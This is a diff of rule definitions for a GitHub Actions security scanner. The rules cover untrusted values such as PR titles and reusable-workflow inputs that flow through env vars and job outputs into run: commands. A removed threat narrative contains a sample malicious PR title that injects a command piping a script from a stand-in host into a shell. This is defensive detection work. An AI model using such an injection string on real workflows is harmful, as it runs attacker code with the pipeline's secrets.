-            "An attacker opens a PR whose title is "
-            '``"; curl evil.sh|sh; #``.  A producer job in the '
-            "workflow declares an output sourced from "
-            "``github.event.pull_request.title`` (often as a "
-            'convenience: "the next job will need this").  A consumer '
-            "job downstream — typically the one with elevated "
-            "permissions because the producer's lower-privilege scope "
-            'made it "safe" to handle PR data — references '
-            "``${{ needs.produce.outputs.title }}`` inside a ``run:`` "
-            "block.  The PR title executes as a shell command in the "
-            "consumer's environment, with the consumer's full token "
-            "and bound secrets.  Single-job rules miss this because "
-            "the taint crosses the job boundary."
+            "Trace the source through a declared cross-job output bridge to the exact owned run: command. An attacker-influenced value used as shell source, command name or interpreter input can affect execution if the event, guards and runtime conditions permit it. A data argument or assignment is a different role; unsupported consumption remains unresolved. Verify source control, shell semantics and available authority separately."
         ),
         incidents=["Ultralytics April 2025"],
         confidence="high",
@@ -2208,10 +1873,7 @@ RULES = [
     # =========================================================================
     Rule(
         id="TAINT-GH-012",
-        title=(
-            "Attacker-controlled context flows through env var into a "
-            "double-quoted shell reference (lint)"
-        ),
+        title=("Quoted untrusted workflow value needs downstream-consumer review"),
         severity=Severity.MEDIUM,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
@@ -2219,37 +1881,14 @@ RULES = [
         review_needed=True,
         finding_family="script_injection",
         description=(
-            "A tainted GitHub-Actions context (PR title/body, comment "
-            "body, head_ref, ...) flows through a step or job env var "
-            "into a run: block where every reference is safely "
-            'double-quoted (``"$VAR"`` / ``"${VAR}"``) and the '
-            "line contains no eval-class re-parsing command. Direct "
-            "shell injection at this sink is not possible — the value "
-            "passes as a single literal argument. The finding stays "
-            "at MEDIUM (low confidence) so reviewers can verify no "
-            "downstream consumer in the same script re-parses the "
-            "value (eval, sh -c, source, etc.). The unsafe shapes "
-            "(unquoted reference, eval-class consumption) are "
-            "covered by TAINT-GH-001."
+            "A tracked value reaches a quoted shell argument without a supported code role. Supported ordinary data use is distinguished from unresolved shell semantics. Quoting prevents ordinary field splitting in the supported shell profile; it does not certify an arbitrary downstream consumer or runtime command binding. Supported interpreter code operands and stdin pipelines take the execution route instead."
         ),
         pattern=TaintPattern(
             kind_filter="shallow",
             sink_quote_filter="safely_quoted_only",
         ),
         remediation=(
-            "If the value is only used as a single string argument "
-            "(echo, printf, comparisons inside [[ ]] / [ ]), no "
-            "change is required — the double-quoting is already the "
-            "recommended safe shape. If you want to suppress this "
-            "lint, add an inline ``# taintly: ignore[TAINT-GH-012]`` "
-            "comment on the run: line, or an entry under "
-            "``ignored_rules`` in ``.taintly.yml``.\n"
-            "\n"
-            "If the value IS later passed to ``eval``, ``sh -c``, "
-            "``bash -c``, ``source``, or another re-parsing command, "
-            "the chain becomes a CRITICAL TAINT-GH-001 finding "
-            "instead — sanitize via parameter expansion before the "
-            "re-parsing step."
+            "Keep untrusted values as data. Bind the value with env: and use a quoted argument with a literal format, for example: run: printf '%s\\n' \"$TITLE\". Parameter expansion does not recursively execute syntax inside the value, but unquoted arguments can split words and expand file globs. Do not put the value in command position, eval, shell -c, other interpreter code operands, or a pipe into an interpreter. A file or stdin is only a data boundary when the consumer treats it as data. Avoid ${{ env.TITLE }}, step-output or needs-output substitution inside run: text: Actions renders those bytes before shell parsing. Trace every propagation hop, inspect downstream options and validate the configured shell. Verify event guards, caller control and effective credentials separately."
         ),
         reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
         test_positive=[
@@ -2307,14 +1946,7 @@ RULES = [
         ],
         stride=["T"],
         threat_narrative=(
-            "POSIX shell parameter expansion does not re-tokenise the "
-            "value's contents inside double quotes, so a tainted env "
-            'var consumed via ``echo "$VAR"`` or '
-            '``[[ "$VAR" == ... ]]`` does not produce direct command '
-            "injection. The lint stays in the report so reviewers can "
-            "verify the value isn't fed to a downstream re-parser later "
-            "in the script (eval, sh -c, source) where the safety would "
-            "no longer hold."
+            "Review the exact consuming command and its data/code interface. Ordinary quoted parameter expansion does not recursively execute the value. An unsupported consumer, shell or runtime binding remains unknown; quoting alone is not a complete safety or exploitation proof."
         ),
         incidents=[],
     ),
@@ -2874,67 +2506,18 @@ RULES = [
     # =========================================================================
     Rule(
         id="TAINT-GH-017",
-        title=(
-            "Reusable-workflow input propagates through env / step outputs into a shell run: block"
-        ),
+        title=("Workflow input reaches a shell code-bearing role; verify caller control"),
         severity=Severity.MEDIUM,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         confidence="medium",
         review_needed=True,
         description=(
-            "A reusable workflow (``on: workflow_call``) takes a "
-            "``${{ inputs.<name> }}`` value and launders it through "
-            "one or more ``env:`` assignments, ``$GITHUB_ENV`` / "
-            "``$GITHUB_OUTPUT`` writes, or declared job ``outputs:`` "
-            "before it reaches a shell ``run:`` block.\n"
-            "\n"
-            "TAINT-GH-006 flags the *direct* ``${{ inputs.X }}`` "
-            "reference for review; this rule traces the *propagated* "
-            "flow — the multi-hop / env-mediated / cross-job shapes a "
-            "single structural reference check does not follow — so a "
-            "reviewer sees the whole chain from the input boundary to "
-            "the sink.\n"
-            "\n"
-            "Scoped to the *unsafe* sink shape: the laundered value "
-            "reaches the ``run:`` block unquoted, or inside an "
-            "eval-class command (``eval``, ``sh -c``, ...).  A "
-            "double-quoted reference of a plausibly-constrained input "
-            "(a version, a platform) is far lower risk and would "
-            "drown the signal — those are left out of scope.\n"
-            "\n"
-            "Review-needed, not a confirmed risk: whether the input "
-            "actually carries attacker-controlled bytes depends on "
-            "the *callers*.  An input is dangerous when some caller "
-            "forwards ``github.event.pull_request.title``, "
-            "``github.head_ref``, an issue / comment body, or a "
-            "similar attacker-controlled context into it (see "
-            "TAINT-GH-007 for the caller side).  This rule shows the "
-            "callee-side liability so the input contract can be "
-            "audited or hardened."
+            "A tracked workflow value reaches a run: command through a workflow-input environment binding. Under the supported configured shell profile, CODE means source interpolation, command selection, a supported interpreter code operand or interpreter stdin. Ordinary parameter expansion as data does not recursively execute syntax in the value. The occurrence is qualified as review-needed when use is DATA or UNKNOWN. Configured code use alone does not establish actual triggering, attacker control, successful execution or effective token and secret access. Reusable-workflow inputs are caller-controlled, not necessarily attacker-controlled."
         ),
         pattern=TaintPattern(source_filter="inputs", sink_quote_filter="unsafe_only"),
         remediation=(
-            "Treat ``inputs.*`` in a reusable workflow as untrusted "
-            "until the input contract proves otherwise:\n"
-            "\n"
-            "1. Document which inputs may carry attacker-controlled "
-            "   data and audit every caller; never let a caller "
-            "   forward ``github.event.*`` / ``github.head_ref`` into "
-            "   such an input unsanitised.\n"
-            "\n"
-            "2. In the callee, never interpolate the input — or a "
-            "   variable laundered from it — directly into ``run:``. "
-            "   Bind it to a quoted env var and reference the "
-            "   variable:\n"
-            "\n"
-            "       env:\n"
-            '         TITLE: "${{ inputs.title }}"\n'
-            '       run: ./tool "$TITLE"\n'
-            "\n"
-            "3. Validate / allow-list the input at the top of the "
-            "   reusable workflow so every downstream step inherits "
-            "   the safe shape."
+            "Keep untrusted values as data. Bind the value with env: and use a quoted argument with a literal format, for example: run: printf '%s\\n' \"$TITLE\". Parameter expansion does not recursively execute syntax inside the value, but unquoted arguments can split words and expand file globs. Do not put the value in command position, eval, shell -c, other interpreter code operands, or a pipe into an interpreter. A file or stdin is only a data boundary when the consumer treats it as data. Avoid ${{ env.TITLE }}, step-output or needs-output substitution inside run: text: Actions renders those bytes before shell parsing. Trace every propagation hop, inspect downstream options and validate the configured shell. Verify event guards, caller control and effective credentials separately."
         ),
         reference="https://docs.github.com/en/actions/using-workflows/reusing-workflows#using-inputs-and-secrets-in-a-reusable-workflow",
         test_positive=[
@@ -3009,14 +2592,7 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "A reusable workflow accepts a string input and, as a "
-            "convenience, binds it to an env var that a later step "
-            "interpolates into a shell command.  A caller — perhaps "
-            "one the reusable workflow's author never reviewed — "
-            "forwards ``github.event.pull_request.title`` into that "
-            "input from a PR-triggered pipeline.  The PR title runs "
-            "as a shell command inside the reusable workflow, with "
-            "whatever token and secrets the call was granted."
+            "Trace the source through a workflow-input environment binding to the exact owned run: command. An attacker-influenced value used as shell source, command name or interpreter input can affect execution if the event, guards and runtime conditions permit it. A data argument or assignment is a different role; unsupported consumption remains unresolved. Verify source control, shell semantics and available authority separately. Caller trust and allowed input values are required review prerequisites."
         ),
     ),
     # =========================================================================
